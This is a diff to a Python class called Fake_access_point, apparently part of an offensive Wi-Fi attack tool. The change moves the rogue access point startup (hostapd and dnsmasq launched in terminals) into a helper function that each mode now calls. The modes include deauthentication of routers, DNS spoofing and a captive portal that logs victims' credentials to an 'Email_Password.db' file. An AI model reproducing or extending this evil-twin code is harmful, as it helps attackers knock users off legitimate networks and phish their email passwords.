@@ -302,7 +302,8 @@ class Fake_access_point:
               except KeyboardInterrupt:
                      exit()
       def call_tremmial(self):
-          def Set_Log():             
+          def Set_Log(): 
+                   
               subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"],shell=True)
               subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/read_errorLOG.py"],shell=True)
               command_run = Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"
@@ -314,27 +315,32 @@ class Fake_access_point:
               with open(Curent_dir+'/Email_Password.db','a') as DB_PASS :
                     group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Email_Password.db" 
                     os.system(group1)
-          try:   
-              subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
-              order = Curent_dir+"/Snake_Package/Host_apd.py"             
-              command_proc = ' gnome-terminal --geometry 95x30+100+10 -e ' +'"' + order  +'"'                  
-              call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)              
-     
-              order2 = "dnsmasq -C dnsmasq.conf -d"
-              command_proc2 = ' gnome-terminal --geometry 95x30+100+5000  -e ' +'"' + order2 +'"'         
-              call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
+          try: 
+              def WifiAP():
+                  subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
+                  order = Curent_dir+"/Snake_Package/Host_apd.py"             
+                  command_proc = ' gnome-terminal --geometry 95x30+100+10 -e ' +'"' + order  +'"'                  
+                  call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)              
+         
+                  order2 = "dnsmasq -C dnsmasq.conf -d"
+                  command_proc2 = ' gnome-terminal --geometry 95x30+100+5000  -e ' +'"' + order2 +'"'         
+                  call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
+
               if self.args.dns and not self.args.Deauth\
               and  not self.args.Portal :
                  from Snake_Package.dns_spoofing import DNS_Spoofing
                  run = DNS_Spoofing()
+                 WifiAP()
               elif self.args.Deauth\
               and not self.args.dns and not self.args.Portal :                                
                   run = Deauth_Router()  
+                  WifiAP()
               elif self.args.Deauth and self.args.dns\
               and not self.args.Portal :
                     from Snake_Package.dns_spoofing import DNS_Spoofing
                     run = Deauth_Router()  
-                    run = DNS_Spoofing()  
+                    run = DNS_Spoofing() 
+                    WifiAP() 
               elif self.args.Portal\
               and not self.args.dns and not self.args.Deauth:
                  from Snake_Package.Captive_Portal import Captive_Portal
@@ -344,10 +350,12 @@ class Fake_access_point:
                       time.sleep(.0001)
                  run = Captive_Portal()  
                  Set_Log()
+                 WifiAP()
               else:
                    if not self.args.dns and not self.args.Deauth\
                    and not self.args.Portal:
                       print("[+] access point start ")
+                      WifiAP()
                       exit()
           except KeyboardInterrupt :
                   Command  = [
